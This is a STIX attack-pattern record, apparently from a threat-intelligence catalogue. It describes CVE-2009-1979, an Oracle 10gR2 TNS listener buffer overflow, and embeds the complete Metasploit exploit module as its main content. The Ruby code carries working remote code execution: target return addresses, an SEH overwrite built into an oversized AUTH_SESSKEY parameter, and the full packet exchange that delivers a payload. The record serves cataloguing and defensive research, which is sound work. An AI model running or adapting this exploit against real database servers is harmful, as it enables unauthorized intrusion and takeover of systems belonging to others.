{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--936e0cc7-3ac9-4f82-a18e-f1a35c4bf9f3",
    "created": "2024-08-14T16:50:20.848049Z",
    "modified": "2024-08-14T16:50:20.848053Z",
    "name": "AUTH_SESSKEY",
    "description": " This module exploits a stack buffer overflow in Oracle. When sending a specially crafted packet containing a long AUTH_SESSKEY value to the TNS service, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/oracle/tns_auth_sesskey.rb",
            "external_id": "tns_auth_sesskey.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1979"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.conus.info/node/28"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.conus.info/node/35"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2009.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::TNS\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle 10gR2 TNS Listener AUTH_SESSKEY Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in Oracle. When\n        sending a specially crafted packet containing a long AUTH_SESSKEY value\n        to the TNS service, an attacker may be able to execute arbitrary code.\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-1979'],\n          [ 'OSVDB', '59110'],\n          [ 'BID', '36747'],\n          [ 'URL', 'http://blogs.conus.info/node/28' ],\n          [ 'URL', 'http://blogs.conus.info/node/35' ],\n          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2009.html' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 0x17e,\n          'BadChars' => \"\", # none, thx memcpy!\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n\n          [ 'Oracle 10.2.0.1.0 Enterprise Edition',\n            {\n              # Untested\n              'Ret' => 0x011b0528 # p/p/r in oracle.exe v10.2.0.3\n            }\n          ],\n          [ 'Oracle 10.2.0.4.0 Enterprise Edition',\n            {\n              # Tested OK - 2010-Jan-20 - jduck\n              'Ret' => 0x01347468 # p/p/r in oracle.exe v10.2.0.3\n            }\n          ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2009-10-20'))\n\n    register_options(\n      [\n        OptString.new('SID', [ true, 'The target database SID', 'ORCL']),\n        Opt::RPORT(1521)\n      ])\n  end\n\n\n  def check\n    version = tns_version\n    if (not version)\n      vprint_error(\"Unable to detect the Oracle version!\")\n      return Exploit::CheckCode::Unknown\n    end\n    vprint_status(\"Oracle version reply: \" + version)\n    return Exploit::CheckCode::Appears if (version =~ /32-bit Windows: Version 10\\.2\\.0\\.1\\.0/)\n    return Exploit::CheckCode::Appears if (version =~ /32-bit Windows: Version 10\\.2\\.0\\.4\\.0/)\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n\n    mytarget = nil\n    if target.name =~ /Automatic/\n      print_status(\"Attempting automatic target detection...\")\n\n      version = tns_version\n      if (not version)\n        fail_with(Failure::NoTarget, \"Unable to detect the Oracle version!\")\n      end\n\n      if (version =~ /32-bit Windows: Version 10\\.2\\.0\\.1\\.0/)\n        mytarget = targets[1]\n      elsif (version =~ /32-bit Windows: Version 10\\.2\\.0\\.4\\.0/)\n        mytarget = targets[2]\n      end\n\n      if (not mytarget)\n        fail_with(Failure::NoTarget, \"Unable to automatically detect the target\")\n      end\n\n      print_status(\"Automatically detected target \\\"#{mytarget.name}\\\"\")\n    else\n      mytarget = target\n\n      print_status(\"Attacking using target \\\"#{mytarget.name}\\\"\")\n    end\n\n\n    username = rand_text_alphanumeric(0x1c)\n\n    connect\n\n    print_status(\"Sending NSPTCN packet ...\")\n    connect_data = \"\" +\n      \"(DESCRIPTION=\" +\n        \"(CONNECT_DATA=\" +\n          \"(SERVICE_NAME=#{datastore['SID']})\" +\n          \"(CID=\" +\n            \"(PROGRAM=client.exe)\" +\n            \"(HOST=client_host)\" +\n          \")\" +\n        \")\" +\n        \"(ADDRESS=\" +\n          \"(PROTOCOL=TCP)\" +\n          \"(PORT=1521)\" +\n        \")\" +\n      \")\"\n    nsptcn_pkt = tns_packet(connect_data)\n    sock.put(nsptcn_pkt)\n\n    # read NSPTRS (expecting 8 bytes)\n    res = sock.get_once(-1, 1)\n    #print_status((\"received %u bytes:\\n\" % res.length) + Rex::Text.to_hex_dump(res))\n\n    print_status(\"Re-sending NSPTCN packet ...\")\n    sock.put(nsptcn_pkt)\n\n    # read NSPTAC (expecting 32 bytes)\n    begin\n      res = sock.get_once(-1, 1)\n    rescue ::Errno::ECONNRESET, EOFError\n      fail_with(Failure::Unknown, \"OOPS, maybe the service hasn't started completely yet, try again...\")\n    end\n    #print_status((\"received %u bytes:\\n\" % res.length) + Rex::Text.to_hex_dump(res))\n\n    # send NA\n    print_status(\"Sending NA packet ...\")\n    na_stuff = [0xdeadbeef].pack('N') +\n      \"\\x00\\x92\" +\n      \"\\x0B\\x10\\x06\\x00\\x00\\x04\\x00\\x00\\x04\\x00\\x03\\x00\\x00\\x00\\x00\\x00\" +\n      \"\\x04\\x00\\x05\\x0B\\x10\\x06\\x00\\x00\\x08\\x00\\x01\\x00\\x00\\x0A\\xF8\\x71\" +\n      \"\\xC2\\x6C\\xE1\\x00\\x12\\x00\\x01\\xDE\\xAD\\xBE\\xEF\\x00\\x03\\x00\\x00\\x00\" +\n      \"\\x04\\x00\\x04\\x00\\x01\\x00\\x01\\x00\\x02\\x00\\x01\\x00\\x03\\x00\\x00\\x00\" +\n      \"\\x00\\x00\\x04\\x00\\x05\\x0B\\x10\\x06\\x00\\x00\\x02\\x00\\x03\\xE0\\xE1\\x00\" +\n      \"\\x02\\x00\\x06\\xFC\\xFF\\x00\\x02\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x04\\x00\" +\n      \"\\x05\\x0B\\x10\\x06\\x00\\x00\\x0C\\x00\\x01\\x00\\x11\\x06\\x10\\x0C\\x0F\\x0A\" +\n      \"\\x0B\\x08\\x02\\x01\\x03\\x00\\x03\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x04\\x00\" +\n      \"\\x05\\x0B\\x10\\x06\\x00\\x00\\x03\\x00\\x01\\x00\\x03\\x01\"\n    na_pkt = nsptda_packet(na_stuff)\n    sock.put(na_pkt)\n\n    # read response (expecting 127 bytes)\n    res = sock.get_once(-1, 1)\n    #print_status((\"received %u bytes:\\n\" % res.length) + Rex::Text.to_hex_dump(res))\n\n    # send TTIPRO\n    print_status(\"Sending TTIPRO packet ...\")\n    ttipro_stuff = \"\\x01\\x06\\x05\\x04\\x03\\x02\\x01\\x00\" +\n      \"IBMPC/WIN_NT-8.1.0\" +\n      \"\\x00\"\n    ttipro_pkt = nsptda_packet(ttipro_stuff)\n    sock.put(ttipro_pkt)\n\n    # read response (expecting 179 bytes)\n    res = sock.get_once(-1, 1)\n    #print_status((\"received %u bytes:\\n\" % res.length) + Rex::Text.to_hex_dump(res))\n\n    # send TTIDTY\n    print_status(\"Sending TTIDTY packet ...\")\n    ttidty_stuff = \"\\x02\\xB2\\x00\\xB2\\x00\\xD2\" +\n      \"\\x25\\x06\\x01\\x01\\x01\\x0D\\x01\\x01\\x05\\x01\\x01\\x01\\x01\\x01\\x01\\x01\" +\n      \"\\x7F\\xFF\\x03\\x09\\x03\\x03\\x01\\x00\\x7F\\x01\\x1F\\xFF\\x01\\x03\\x01\\x01\" +\n      \"\\x3F\\x01\\x01\\x05\\x00\\x01\\x07\\x02\\x01\\x00\\x00\\x18\\x00\\x01\\x80\\x00\" +\n      \"\\x00\\x00\\x3C\\x3C\\x3C\\x80\\x00\\x00\\x00\\xD0\\x07\"\n    ttidty_pkt = nsptda_packet(ttidty_stuff)\n    sock.put(ttidty_pkt)\n\n    # read response (expecting 22 bytes)\n    res = sock.get_once(-1, 1)\n    #print_status((\"received %u bytes:\\n\" % res.length) + Rex::Text.to_hex_dump(res))\n\n    # send first auth pkt (call OSESSKEY)\n    print_status(\"Calling OSESSKEY ...\")\n    params = []\n    dtyauth_pkt = dtyauth_packet(0x76, username, 1, params)\n    sock.put(dtyauth_pkt)\n\n    # read RPA (expecting 225 bytes)\n    res = sock.get_once(-1, 1)\n    #print_status((\"received %u bytes:\\n\" % res.length) + Rex::Text.to_hex_dump(res))\n\n    # build exploit buffer\n    print_status(\"Calling kpoauth with long AUTH_SESSKEY ...\")\n    sploit = payload.encoded\n    sploit << rand_text_alphanumeric(0x19a - 0x17e)\n    sploit << generate_seh_record(mytarget.ret)\n    distance = payload_space + 8 + 5\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n\n    # ensure bad ptr is derefed\n    value = rand(0x3fffffff) | 0xc0000000\n    sploit[0x17e,4] = [value].pack('V')\n\n    # send overflow trigger packet (call kpoauth)\n    params = []\n    params << {\n      'Name'   => 'AUTH_SESSKEY',\n      'Value'  => sploit,\n      'Flag'   => 1\n    }\n    dtyauth_pkt = dtyauth_packet(0x73, username, 0x121, params)\n    sock.put(dtyauth_pkt)\n\n    # expecting disconnect...\n    if (res = sock.get_once(-1, 1))\n      print_status((\"received %u bytes:\\n\" % res.length) + Rex::Text.to_hex_dump(res))\n      fail_with(Failure::NoTarget, \"Try to run the exploit again.. If that doesn't work, the target host may be patched :-/\")\n    end\n\n    handler\n    disconnect\n  end\n\n\n  def tns_version\n    connect\n    version = \"(CONNECT_DATA=(COMMAND=VERSION))\"\n    pkt = tns_packet(version)\n    sock.put(pkt)\n    sock.get_once\n    res = sock.get_once(-1, 1)\n    disconnect\n    return res\n  rescue EOFError\n    return nil\n  end\n\n\n  def nsptda_packet(data)\n    pkt = [data.length + 10].pack('n')    # NSPHDLEN\n    pkt << [0].pack('n')                  # NSPHDPSM\n    pkt << [6].pack('C')                  # pkt type\n    pkt << [0].pack('C')                  # reserved\n    pkt << [0].pack('n')                  # NSPHDHSM\n    pkt << [0].pack('n')                  # NSPDAFLG\n    pkt << data\n    return pkt\n  end\n\n\n  def dtyauth_packet(opi, user, flag, params)\n    dunno = 2\n    dunno = 3 if opi == 0x73\n\n    pkt = [3, opi, dunno].pack('CCC')\n\n    pkt << [-2].pack('V')\n    pkt << [user.length].pack('V')\n    pkt << [flag].pack('V')\n\n    pkt << [-2].pack('V')\n    pkt << [params.length].pack('V')\n    pkt << [-2].pack('V')\n    pkt << [-2].pack('V')\n\n    pkt << [user.length].pack('C')\n    pkt << user\n\n    params.each { |param|\n      name = param['Name']\n      pkt << [name.length].pack('V')\n      pkt << [name.length].pack('C')\n      pkt << name\n\n      val = param['Value']\n      pkt << [val.length].pack('V')\n      if (val.length > 0)\n        if (val.length > 0xff)\n          pkt << chunkify(val)\n        else\n          pkt << [val.length].pack('C')\n          pkt << val\n        end\n      end\n\n      flag = param['Flag']\n      pkt << [flag].pack('V')\n    }\n    return nsptda_packet(pkt)\n  end\n\n\n  def chunkify(buf)\n    ret = \"\"\n    if buf.length > 0xff\n      ret << \"\\xfe\"\n\n      while (buf.length > 0xff)\n        ret << \"\\xff\"\n        ret << buf.slice!(0, 0xff)\n      end\n      if buf.length > 0\n        ret << [buf.length].pack('C')\n        ret << buf\n      end\n\n      ret << \"\\x00\"\n    else\n      ret << [buf.length].pack('C')\n      ret << buf\n    end\n    return ret\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-10-20",
    "x_mitre_platforms": [
        "win'"
    ]
}